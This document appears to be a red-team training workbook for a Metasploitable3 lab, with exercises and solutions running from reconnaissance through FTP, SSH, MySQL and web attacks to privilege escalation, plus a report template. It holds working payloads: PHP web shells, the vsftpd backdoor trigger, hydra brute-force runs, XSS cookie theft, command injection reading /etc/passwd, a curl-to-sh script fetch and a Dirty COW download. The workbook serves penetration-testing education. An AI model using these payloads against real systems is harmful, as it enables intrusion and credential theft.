# Red Team Exercise Workbook
## Practical Exercises for Metasploitable3

## 📋 How to Use This Workbook

1. **Setup Environment** - Complete the lab setup first
2. **Read Challenge** - Understand the objective and tools
3. **Attempt Solution** - Try to solve without looking at hints
4. **Review Solution** - Compare your approach with provided solution
5. **Document Findings** - Complete the reporting section

---

## 🏁 EXERCISE 1: Comprehensive Reconnaissance

### Objective
Perform full reconnaissance on the victim machine to build target profile.

### Starting Point
```bash
# Access Kali container
docker exec -it kali_attacker bash

# Update tools
apt update && apt install -y nmap gobuster nikto whatweb
```

### Tasks Checklist
- [ ] Identify all open ports
- [ ] Determine operating system
- [ ] Enumerate web services
- [ ] Discover SMB shares
- [ ] Map network services

### Step-by-Step Guidance

#### Step 1: Initial Scan
```bash
# Quick ping scan
ping -c 3 victim

# Basic port scan
nmap -sS -T4 victim
```

**Expected Output:** List of open ports

#### Step 2: Service Version Detection
```bash
# Service version scan
nmap -sV -sC victim -oN scan-services.txt
```

**Questions to Answer:**
1. What web server is running?
2. What database versions are present?
3. What FTP server is installed?

#### Step 3: Web Enumeration
```bash
# Directory brute force
gobuster dir -u http://victim -w /usr/share/wordlists/dirb/common.txt -o web-dirs.txt

# Technology detection
whatweb http://victim
```

#### Step 4: SMB Enumeration
```bash
# Install SMB tools
apt install -y smbclient enum4linux

# Enumerate SMB
enum4linux -a victim
```

### Solution Walkthrough
<details>
<summary>Click to view solution</summary>

```bash
# 1. Quick discovery
nmap -sn 172.23.0.0/24

# 2. Full port scan
nmap -p- -T4 victim

# 3. Service detection  
nmap -sV -sC -O victim -oA full-scan

# 4. Web enumeration
nikto -h http://victim -o nikto-scan.txt
gobuster dir -u http://victim -w /usr/share/seclists/Discovery/Web-Content/common.txt

# 5. SMB discovery
smbclient -L //victim -N
enum4linux -a victim > smb-enum.txt
```
</details>

### Reporting Template
```markdown
# Reconnaissance Report

## Target: victim (172.23.0.3)

### Open Ports:
- 21/tcp: FTP - vsftpd 2.3.4
- 22/tcp: SSH - OpenSSH 4.7p1
- 80/tcp: HTTP - Apache 2.2.8
- 139/tcp: SMB - Samba 3.0.20
- 445/tcp: SMB - Samba 3.0.20
- 3306/tcp: MySQL - 5.0.51a

### Web Services:
- Apache/2.2.8 (Ubuntu)
- PHP/5.2.4
- Applications: DVWA, Mutillidae

### Vulnerabilities Identified:
1. vsftpd 2.3.4 - Known backdoor vulnerability
2. Samba 3.0.20 - Multiple vulnerabilities
3. MySQL 5.0.51a - Weak default credentials
```

---

## 🎯 EXERCISE 2: FTP Exploitation

### Objective
Gain unauthorized access via FTP and establish foothold.

### Prerequisites
- Exercise 1 completed
- FTP service identified (port 21)

### Tasks Checklist
- [ ] Test anonymous access
- [ ] Brute force credentials
- [ ] Upload web shell
- [ ] Establish command execution

### Step-by-Step Guidance

#### Step 1: Anonymous Access Test
```bash
# Connect to FTP
ftp victim

# Login as anonymous
Username: anonymous
Password: [any email]
```

**If successful:** Explore directory structure

#### Step 2: Credential Brute Force
```bash
# Install hydra if not present
apt install -y hydra

# Brute force FTP
hydra -L /usr/share/wordlists/metasploit/unix_users.txt \
      -P /usr/share/wordlists/rockyou.txt \
      ftp://victim
```

#### Step 3: Web Shell Upload
```bash
# Create simple PHP shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload via FTP
ftp victim
put shell.php
```

#### Step 4: Command Execution
```bash
# Test web shell
curl "http://victim/shell.php?cmd=id"
```

### Solution Walkthrough
<details>
<summary>Click to view solution</summary>

```bash
# 1. Anonymous access works
ftp victim
# Username: anonymous
# Password: test@test.com

# 2. Explore directories
ls -la
cd /var/www
ls -la

# 3. Upload web shell
put shell.php

# 4. Alternative: Use vsftpd backdoor
# vsftpd 2.3.4 has known backdoor
# Connect to port 6200 after sending specific payload
telnet victim 21
USER hello:)
PASS world

# Then connect to backdoor
telnet victim 6200
```
</details>

### Learning Points
- FTP protocol weaknesses
- File upload vulnerabilities
- Backdoor exploitation
- Initial access techniques

---

## 🔓 EXERCISE 3: SSH Compromise

### Objective
Gain SSH access through credential attacks.

### Prerequisites
- SSH service identified (port 22)
- User enumeration completed

### Tasks Checklist
- [ ] Identify valid users
- [ ] Perform dictionary attack
- [ ] Establish SSH session
- [ ] Enumerate system

### Step-by-Step Guidance

#### Step 1: User Enumeration
```bash
# Check for default users
hydra -L /usr/share/wordlists/metasploit/unix_users.txt \
      -p test \
      ssh://victim
```

#### Step 2: Password Attack
```bash
# Targeted attack on discovered users
hydra -l msfadmin \
      -P /usr/share/wordlists/rockyou.txt \
      -t 4 \
      ssh://victim
```

#### Step 3: SSH Access
```bash
# Connect with compromised credentials
ssh msfadmin@victim
# Password: msfadmin
```

#### Step 4: Post-Connection Enumeration
```bash
# Once connected:
whoami
id
uname -a
cat /etc/passwd
```

### Solution Walkthrough
<details>
<summary>Click to view solution</summary>

```bash
# 1. Quick test with default credentials
ssh msfadmin@victim
# Password: msfadmin

# 2. If default fails, brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://victim

# 3. Post-compromise enumeration
# Check sudo privileges
sudo -l

# Check cron jobs
crontab -l
ls -la /etc/cron*

# Check SUID binaries
find / -perm -4000 -type f 2>/dev/null
```
</details>

---

## 🗄️ EXERCISE 4: Database Exploitation

### Objective
Compromise MySQL database and extract data.

### Prerequisites
- MySQL service identified (port 3306)

### Tasks Checklist
- [ ] Connect with default credentials
- [ ] Enumerate databases
- [ ] Extract sensitive data
- [ ] Execute system commands

### Step-by-Step Guidance

#### Step 1: Database Connection
```bash
# Install MySQL client
apt install -y mysql-client

# Connect to MySQL
mysql -h victim -u root -p
# Password: [blank or root]
```

#### Step 2: Database Enumeration
```sql
-- Show databases
SHOW DATABASES;

-- Use a database
USE [database_name];

-- Show tables
SHOW TABLES;

-- Describe table structure
DESCRIBE [table_name];
```

#### Step 3: Data Extraction
```sql
-- Select all data from table
SELECT * FROM [table_name];

-- Dump to file (if file privileges)
SELECT * INTO OUTFILE '/tmp/data.csv' FROM [table_name];
```

#### Step 4: Command Execution
```sql
-- Check for command execution
SELECT sys_exec('whoami');

-- Or via User Defined Functions (UDF)
-- This requires uploading a shared library
```

### Solution Walkthrough
<details>
<summary>Click to view solution</summary>

```bash
# 1. Connect with empty password
mysql -h victim -u root

# 2. Enumerate
SHOW DATABASES;
USE dvwa;
SHOW TABLES;
SELECT * FROM users;

# 3. Check for file privileges
SELECT File_priv FROM mysql.user WHERE User='root';

# 4. Write web shell if file privileges exist
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/shell.php';
```
</details>

---

## 🌐 EXERCISE 5: Web Application Attacks

### Objective
Exploit web vulnerabilities in DVWA/Mutillidae.

### Prerequisites
- Web applications accessible
- Basic web testing knowledge

### Tasks Checklist
- [ ] SQL Injection attack
- [ ] Cross-Site Scripting (XSS)
- [ ] File upload bypass
- [ ] Command injection

### Step-by-Step Guidance

#### Step 1: SQL Injection
```bash
# Test for SQLi
curl "http://victim/dvwa/vulnerabilities/sqli/?id=1'"

# Use sqlmap for automation
sqlmap -u "http://victim/dvwa/vulnerabilities/sqli/?id=1" --batch
```

#### Step 2: XSS Attack
```html
<!-- Test reflected XSS -->
<script>alert('XSS')</script>

<!-- Test stored XSS -->
<img src=x onerror=alert('XSS')>
```

#### Step 3: File Upload Bypass
```bash
# Create malicious file
echo '<?php system($_GET["cmd"]); ?>' > shell.jpg.php

# Upload and test
curl "http://victim/uploads/shell.jpg.php?cmd=id"
```

#### Step 4: Command Injection
```bash
# Test command injection
curl "http://victim/vulnerable.php?ip=127.0.0.1;whoami"

# Use commix for automation
commix -u "http://victim/vulnerable.php?ip=INJECT_HERE"
```

### Solution Walkthrough
<details>
<summary>Click to view solution</summary>

```bash
# 1. SQL Injection in DVWA
# Set security to low first
# Then exploit:
sqlmap -u "http://victim/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="security=low; PHPSESSID=[session]" \
       --batch \
       --dbs

# 2. XSS in Mutillidae
# Navigate to "Add to Your Blog"
# Enter: <script>alert(document.cookie)</script>

# 3. File upload in DVWA
# Upload PHP shell with image extension
# shell.jpg.php with content: <?php system($_GET['c']); ?>

# 4. Command injection
ping.php?ip=127.0.0.1;cat /etc/passwd
```
</details>

---

## ⬆️ EXERCISE 6: Privilege Escalation

### Objective
Escalate from user to root privileges.

### Prerequisites
- Initial access obtained (SSH/FTP/web shell)

### Tasks Checklist
- [ ] System enumeration
- [ ] SUID/SGID binaries
- [ ] Kernel exploits
- [ ] Cron job exploitation

### Step-by-Step Guidance

#### Step 1: System Information
```bash
# Basic system info
uname -a
cat /etc/os-release
cat /etc/issue

# User information
id
whoami
sudo -l
```

#### Step 2: Automated Enumeration
```bash
# Download and run linpeas
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Or linux-exploit-suggester
./linux-exploit-suggester.sh
```

#### Step 3: Manual Checks
```bash
# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Writable files
find / -writable 2>/dev/null | grep -v proc

# Cron jobs
crontab -l
ls -la /etc/cron*
```

#### Step 4: Kernel Exploit
```bash
# Check kernel version
uname -r

# Search for exploits
searchsploit [kernel_version]

# Compile and run exploit
gcc exploit.c -o exploit
./exploit
```

### Solution Walkthrough
<details>
<summary>Click to view solution</summary>

```bash
# 1. Check kernel version
uname -a
# Linux victim 2.6.24-16-server

# 2. Search for exploits
searchsploit 2.6.24

# 3. Dirty Cow exploit (CVE-2016-5195)
# Download and compile
wget https://www.exploit-db.com/download/40839 -O dirty.c
gcc -pthread dirty.c -o dirty -lcrypt

# 4. Run exploit
./dirty
# Sets root password to "dirty"

# 5. Alternative: SUID exploit
# Find SUID binaries
find / -perm -4000 2>/dev/null

# If find has SUID:
find . -exec /bin/sh \; -quit
```
</details>

---

## 📊 EXERCISE 7: Reporting and Documentation

### Objective
Create professional engagement report.

### Prerequisites
- All exercises completed
- Notes and screenshots collected

### Tasks Checklist
- [ ] Executive summary
- [ ] Technical findings
- [ ] Risk assessment
- [ ] Recommendations

### Report Template

```markdown
# Red Team Engagement Report
## Target: Metasploitable3 Lab
## Date: [Date]

## Executive Summary
[Brief overview of engagement, key findings, risk level]

## Scope
- IP Range: 172.23.0.0/24
- Target: victim (172.23.0.3)
- Methodology: OWASP, PTES

## Timeline
- Reconnaissance: [Date/Time]
- Initial Compromise: [Date/Time]
- Privilege Escalation: [Date/Time]
- Data Exfiltration: [Date/Time]

## Technical Findings

### 1. Vulnerability: Weak FTP Configuration
- **CVSS Score:** 7.5 (High)
- **Description:** Anonymous access enabled
- **Impact:** Unauthorized file upload
- **Proof:** [Screenshot/command output]
- **Remediation:** Disable anonymous access

### 2. Vulnerability: Default SSH Credentials
- **CVSS Score:** 9.8 (Critical)
- **Description:** Default credentials (msfadmin/msfadmin)
- **Impact:** Full system compromise
- **Proof:** [Screenshot]
- **Remediation:** Change default passwords

[Continue with all findings...]

## Attack Chain
1. Reconnaissance identified open ports
2. FTP anonymous access allowed file upload
3. Web shell provided command execution
4. SSH default credentials gave user access
5. Kernel exploit provided root privileges

## Risk Assessment
- **Critical:** 3 vulnerabilities
- **High:** 2 vulnerabilities  
- **Medium:** 4 vulnerabilities
- **Low:** 1 vulnerability

## Recommendations
### Immediate (24-48 hours):
1. Change all default credentials
2. Disable anonymous FTP access
3. Update vulnerable services

### Short-term (1-2 weeks):
1. Implement password policy
2. Configure firewall rules
3. Enable logging and monitoring

### Long-term (1-3 months):
1. Regular vulnerability scanning
2. Security awareness training
3. Incident response planning

## Appendices
- A: Nmap scan results
- B: Exploit code used
- C: Screenshots
- D: Tool configurations
```

---

## 🎓 FINAL ASSESSMENT

### Scoring Rubric
| Category | Points | Description |
|----------|--------|-------------|
| Reconnaissance | 20 | Comprehensive network and service discovery |
| Exploitation | 30 | Successful compromise of multiple services |
| Privilege Escalation | 20 | Root access achieved |
| Documentation | 15 | Clear notes and evidence |
| Reporting | 15 | Professional engagement report |
| **Total** | **100** | |

### Grading Scale
- **90-100:** Excellent - Mastery demonstrated
- **80-89:** Good - Strong understanding
- **70-79:** Satisfactory - Basic competency
- **Below 70:** Needs improvement

### Certification Readiness
Complete all exercises with 80+ points to demonstrate readiness for:
- Certified Red Team Analyst
- OSCP Certification
- Practical penetration testing roles

---

## 🔄 CONTINUOUS IMPROVEMENT

### After Completing Exercises:
1. **Review mistakes** - What challenges did you face?
2. **Research alternatives** - Could you solve it differently?
3. **Automate processes** - Create scripts for repetitive tasks
4. **Teach others** - Explain concepts to reinforce learning

### Next Steps:
1. Try the same exercises without hints
2. Time yourself for speed runs
3. Combine multiple attack vectors
4. Practice on other vulnerable machines

---

*Good luck with your Certified Red Team Analyst training!* 🎯